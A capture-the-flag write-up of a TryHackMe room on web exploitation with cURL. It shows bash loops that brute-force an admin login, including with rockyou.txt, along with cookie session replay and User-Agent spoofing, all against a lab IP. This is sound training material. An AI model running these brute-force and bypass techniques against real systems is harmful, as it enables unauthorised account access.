# Exploitation with cURL - Hoperation Eggsploit

Here is the link to the [room](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)

### Purpose of the room:
Understand how to perform basic web exploitation using cURL from the command line, without having to rely on a browser or GUI tools. This includes making basic GET and POST requests, and working with cookies

### Learning Objectives:
- Understand what HTTP requests and responses are at a high level.
- Use cURL to make basic requests (using GET) and view raw responses in the terminal.
- Send POST requests with cURL to submit data to endpoints.
- Work with cookies and sessions in cURL to maintain login state across requests.

**cURL** - a command-line tool for crafting HTTP requests and viewing raw responses; ideal when you need precision or when GUI tools aren't available.
## HTTP Requests Using cURL
Once AttackBox is open, we'll send this command
`curl http://<target-machine-ip>/`

Expected output:
![](attachments/Pasted%20image%2020251224214309.png)

`curl` sends an `HTTP GET` request for the site homepage. We then receive an HTTP response containing the body that's then printed in the terminal. We only get the text version in the terminal

### Sending POST Requests
If we have login form where the POST target is `/post.php` we can send a login form submission using cURL. It would be structured something like this:

`curl -X POST -d "username=user&password=user" http://10.67.163.215/post.php`
- `-X POST` tells cURL to use the POST method.
- `-d` defines the data we're sending in the body of the request.
- The data will be sent in URL-encoded format, which is the same as what HTML forms use.

![](attachments/Pasted%20image%2020251224215123.png)

That command is basically what happens when you log in to a website through a browser. It sends a POST request to the server using the entered credentials

We can also include additional fields. For example, if the application expects a "Login" button
`curl -X POST -d "username=user&password=user&submit=Login" http://10.67.163.215/post.php`

To view what the server returns, including headers and potential redirects, we can add the `-i` flag:
`curl -i -X POST -d "username=user&password=user" http://10.67.163.215/post.php`

If the site responds with a Set-Cookie header, it usually means a successful login attempt or at least triggered a session

![](attachments/Pasted%20image%2020251224215347.png)

### Using Cookies and Sessions
Cookies are used by web applications to keep your session active. These get sent automatically every time you make another request with your browser, but we have to do it manually with cURL

To do this, we save the cookies and then reuse them
1. Saving the cookies:
	`curl -c cookies.txt -d "username=admin&password=admin" http://10.67.163.215/session.php`
	- The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
	- You'll often see a session cookie like `PHPSESSID=xyz123`.
2. Reusing the cookies
	`curl -b cookies.txt http://10.67.163.215/session.php`
	- The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.

This is what goes in session replaying: you replay valid cookies in separate requests

### Automating Login and Performing Brute Force using cURL
We know how to send POST requests, and we can manage sessions. Now we want to simulate a brute-force attack against a weak login form using cURL

First, create a file called `passwords.txt` with the following passwords:
````text
admin123
password
letmein
secretpass
secret
````

![](attachments/Pasted%20image%2020251224220806.png)
![](attachments/Pasted%20image%2020251224220840.png)

`Ctrl+X` then press enter to save the file. Take note of where you saved this passwords.txt file

Next, create a simple bash loop called `loop.sh` to try each password against `bruteforce.php` and copy-paste the following code
````bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.67.163.215/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
````

*Note*: Create bash loop using `nano loop.sh` in the terminal
How the above script works:
- `$(cat passwords.txt)` reads each password from the file.
- `curl -s` sends the login request silently (no progress meter).
- The response is stored in a variable.
- `grep -q` checks if the response contains a success string (like “Welcome”).
- When found, it prints the working password and exits the loop.

Now we can add the execute permission to the script and run it
```bash
 # adds the execute permission
chmod +x loop.sh

 # runs the program
./loop.sh
```

![](attachments/Pasted%20image%2020251224221528.png)

While tools like Hydra, Burp Intruder and WFuzz are automated, this manual method helps you understand what is actually happening: a repetitive HTTP POST with variable data, waiting for a different response.

### Bypassing User-Agent Checks
Some applications block cURL by checking the User-Agent header e.g.the server may reject requests with: `User-Agent: curl/7.x.x`

To specify a customer user-agent, use the `-A` flag
`curl -A "internalcomputer" http://10.67.163.215/ua_check.php`
![](attachments/Pasted%20image%2020251224222315.png)

To confirm the check, we can use the following:
`curl -i http://10.67.163.215/ua_check.php`
`curl -i -A "internalcomputer" http://10.67.163.215/ua_check.php`

![](attachments/Pasted%20image%2020251224222251.png)

![](attachments/Pasted%20image%2020251224222303.png)

If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

## Practical
Now we have a good foundation of how to use cURL, we can answer the questions and search for flags

### 1. Make a **POST** request to the `/post.php` endpoint with the **username** `admin` and the **password** `admin`. What is the flag you receive?

We need to craft the POST request using the provided credentials. Click here to review [making POST requests](#Sending%20POST%20Requests). 
We can use `curl -X POST -d "username=admin&password=admin" http://<target-machine-ip>/post.php` 
We should then have a "Login Successful!" message printed out to the terminal, along with the flag.

### 2. Make a request to the `/cookie.php` endpoint with the **username** `admin` and the **password** `admin` and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?

Now we're making a request for the cookies. Click here to review [how to use cookies](#Using%20Cookies%20and%20Sessions). 
First to save the cookies, we can use `curl -c cookies.txt -d "username=admin&password=admin" http://10.67.163.215/cookie.php`
You should get a response saying "Login successful. Cookie set.", confirming that you've successfully established a session and obtained the cookies to persist this session.

Now to reuse the cookies, use `curl -b cookies.txt http://10.67.163.215/cookie.php`
You should get a response saying "Welcome back, admin!", followed by the flag

### 3. After doing the brute force on the `/bruteforce.php` endpoint, what is the password of the `admin` user?

This should have been achieved in the earlier brute-force attack. Click [Automating Login and Performing Brute Force using cURL](#Automating%20Login%20and%20Performing%20Brute%20Force%20using%20cURL) to review how to perform a brute-force attack with a simple password list.
### 4. Make a request to the `/agent.php` endpoint with the user-agent `TBFC`. What is the flag your receive?

Now we want to bypass the user-agent check. Click here to review how to [bypass user-agent checks](#Bypassing%20User-Agent%20Checks). 

We need to specify a user-agent that is recognized and allowed by the web application. We can use `curl -A "TBFC" http://10.67.163.215/agent.php`
The flag should immediately be printed to the screen

## Bonus Mission
**This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don’t intend to attempt it.**

Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

**Hint:** Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

**Server**: `http://10.67.163.215/terminal.php?action=panel`

### Solution
We know how to perform simple brute-force attacks now. Click here to review [Automating Login and Performing Brute Force using cURL](#Automating-Login-and-Performing-Brute-Force-using-cURL). 

We can use the script from before to perform this attack, with a few changes:

````bash
for pass in $(cat /usr/share/wordlists/rockyou.txt); do
 # echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.67.163.215/terminal.php?action=panel)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
````

We changed the password file from `passwords.txt` to `rockyou.txt` for this problem. We've also changed the address we want to attack to the given server address `http://10.67.163.215/terminal.php?action=panel`

*Note*: The `rockyou.txt` file is typically saved in the `wordlists` folder on Kali Linux machines. It's typically saved in the same directory, so you can use `ls -lh /usr/share/wordlists/` to see all the different wordlists.
![](attachments/Pasted%20image%2020251224230347.png)
I have changed the script to include the file path so the scripts knows where to read the passwords from.
You can also comment out the `echo "Trying password: $pass"` line in the script. If not, every attempted password is printed to the terminal, and the password list has a lot of passwords.

Create a new file called `bonusloop.sh` and save the new script there.
Create the executable then run the script
```bash
chmod +x bonusloop.sh
./bonusloop.sh
```

When the script is running, it may take a while to get a result as the passwords list file is big.